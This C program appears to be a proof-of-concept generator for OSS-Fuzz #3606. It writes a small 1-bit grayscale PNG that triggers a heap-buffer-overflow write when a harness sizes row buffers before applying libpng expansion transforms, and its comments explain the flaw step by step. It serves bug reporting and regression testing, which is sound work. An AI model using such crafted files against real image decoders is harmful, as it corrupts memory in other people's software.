/*
 * gen_poc.c: Generate a PoC PNG file that triggers the heap-buffer-overflow
 * in png_combine_row / png_read_row (OSV-2017-41 / OSS-Fuzz #3606).
 *
 * The vulnerability: the fuzzer allocates row_ptr using png_get_rowbytes()
 * BEFORE setting up transforms (gray_to_rgb, expand, scale_16, add_alpha).
 * These transforms dramatically increase the output row size, but the buffer
 * remains at the pre-transform size. When png_read_row() writes the
 * transformed row into this undersized buffer, it causes a heap-buffer-overflow
 * WRITE.
 *
 * This PoC generates a minimal 1-bit grayscale PNG. The pre-transform row
 * size is tiny (e.g., 1 byte for 8 pixels at 1-bit depth), but after
 * the transforms are applied the row expands to 4 bytes/pixel (RGBA 8-bit),
 * causing a large overwrite.
 *
 * Image: 16x4 pixels, 1-bit grayscale, non-interlaced.
 * Pre-transform rowbytes: 2  (16 pixels * 1 bit / 8)
 * Post-transform rowbytes: 64 (16 pixels * 4 bytes RGBA)
 * Overflow: 62 bytes per row
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

/* CRC-32 over a PNG chunk type + data */
static unsigned long png_crc(const unsigned char *buf, size_t len) {
    return crc32(crc32(0, NULL, 0), buf, len);
}

/* Write a PNG chunk: length(4) + type(4) + data(length) + crc(4) */
static size_t write_chunk(unsigned char *out, const char *type,
                          const unsigned char *data, size_t datalen) {
    size_t pos = 0;
    unsigned long c;

    /* length (big-endian) */
    out[pos++] = (datalen >> 24) & 0xff;
    out[pos++] = (datalen >> 16) & 0xff;
    out[pos++] = (datalen >> 8) & 0xff;
    out[pos++] = datalen & 0xff;

    /* type */
    memcpy(out + pos, type, 4);
    pos += 4;

    /* data */
    if (datalen > 0) {
        memcpy(out + pos, data, datalen);
        pos += datalen;
    }

    /* crc over type+data */
    c = png_crc(out + 4, 4 + datalen);
    out[pos++] = (c >> 24) & 0xff;
    out[pos++] = (c >> 16) & 0xff;
    out[pos++] = (c >> 8) & 0xff;
    out[pos++] = c & 0xff;

    return pos;
}

int main(int argc, char **argv) {
    const char *outfile = "poc.png";
    if (argc > 1) outfile = argv[1];

    /*
     * IHDR: 16 pixels wide, 4 pixels tall, 1-bit grayscale, non-interlaced.
     *
     * With 1-bit grayscale:
     *   rowbytes = ceil(16 * 1 / 8) = 2 bytes
     *
     * After transforms (gray_to_rgb + expand + scale_16 + add_alpha):
     *   Each pixel becomes RGBA 8-bit = 4 bytes
     *   Post-transform rowbytes = 16 * 4 = 64 bytes
     *
     * The fuzzer allocates a buffer of 2 bytes per row but writes 64 bytes,
     * causing a 62-byte heap-buffer-overflow per row.
     */

    unsigned char ihdr[13];
    unsigned int width = 16, height = 4;
    ihdr[0] = (width >> 24) & 0xff;
    ihdr[1] = (width >> 16) & 0xff;
    ihdr[2] = (width >> 8) & 0xff;
    ihdr[3] = width & 0xff;
    ihdr[4] = (height >> 24) & 0xff;
    ihdr[5] = (height >> 16) & 0xff;
    ihdr[6] = (height >> 8) & 0xff;
    ihdr[7] = height & 0xff;
    ihdr[8] = 1;   /* bit depth = 1 */
    ihdr[9] = 0;   /* color type = grayscale */
    ihdr[10] = 0;  /* compression method = deflate */
    ihdr[11] = 0;  /* filter method = adaptive */
    ihdr[12] = 0;  /* interlace method = none */

    /*
     * IDAT: image data.
     * Each row is: 1 filter byte + rowbytes (2 bytes for 16 pixels at 1-bit)
     * 4 rows, each 3 bytes = 12 bytes of raw data.
     * All pixels white (0xff), filter type 0 (None).
     */
    unsigned char rawdata[4 * 3]; /* 4 rows * (1 filter + 2 data) */
    for (int row = 0; row < 4; row++) {
        rawdata[row * 3 + 0] = 0;    /* filter: None */
        rawdata[row * 3 + 1] = 0xff; /* pixel data (all white) */
        rawdata[row * 3 + 2] = 0xff;
    }

    /* Compress the raw image data with zlib */
    unsigned char compressed[256];
    unsigned long complen = sizeof(compressed);
    if (compress2(compressed, &complen, rawdata, sizeof(rawdata), 9) != Z_OK) {
        fprintf(stderr, "compress2 failed\n");
        return 1;
    }

    /* Assemble the PNG file */
    unsigned char png[1024];
    size_t pos = 0;

    /* PNG signature */
    unsigned char sig[8] = {137, 80, 78, 71, 13, 10, 26, 10};
    memcpy(png + pos, sig, 8);
    pos += 8;

    /* IHDR chunk */
    pos += write_chunk(png + pos, "IHDR", ihdr, sizeof(ihdr));

    /* IDAT chunk */
    pos += write_chunk(png + pos, "IDAT", compressed, complen);

    /* IEND chunk */
    pos += write_chunk(png + pos, "IEND", NULL, 0);

    /* Write to file */
    FILE *f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }
    fwrite(png, 1, pos, f);
    fclose(f);

    printf("Generated PoC PNG: %s (%zu bytes)\n", outfile, pos);
    printf("  Image: %ux%u, 1-bit grayscale, non-interlaced\n", width, height);
    printf("  Pre-transform rowbytes:  2\n");
    printf("  Post-transform rowbytes: 64 (16 * 4 RGBA)\n");
    printf("  Overflow per row: 62 bytes\n");
    return 0;
}
